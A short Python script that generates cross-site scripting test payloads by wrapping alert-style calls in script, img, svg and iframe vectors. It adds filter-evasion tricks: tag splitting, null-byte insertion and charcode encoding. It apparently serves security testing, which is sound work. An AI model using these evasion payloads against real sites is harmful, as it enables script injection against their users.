import random

def generate_payloads():
    base_payloads = [
        'alert(1)', 
        'confirm(1)', 
        'prompt(1)', 
        'document.write(1)'
    ]
    
    obfuscations = [
        lambda x: f"<script>{x}</script>",
        lambda x: f"<img src=x onerror={x}>",
        lambda x: f"<svg/onload={x}>",
        lambda x: f"<iframe src='javascript:{x}'></iframe>",
        lambda x: f"<scr<script>ipt>{x}</scr</script>ipt>",  # tag splitting
        lambda x: f"<scr\\0ipt>{x}</scr\\0ipt>",  # null byte evasion
        lambda x: f"<script>eval(String.fromCharCode({','.join(str(ord(c)) for c in x)}))</script>",  # charcode encoding
    ]

    payloads = []

    for base in base_payloads:
        for obfuscate in obfuscations:
            payloads.append(obfuscate(base))

    return payloads

if __name__ == "__main__":
    payloads = generate_payloads()
    for i, payload in enumerate(payloads):
        print(f" {payload}")
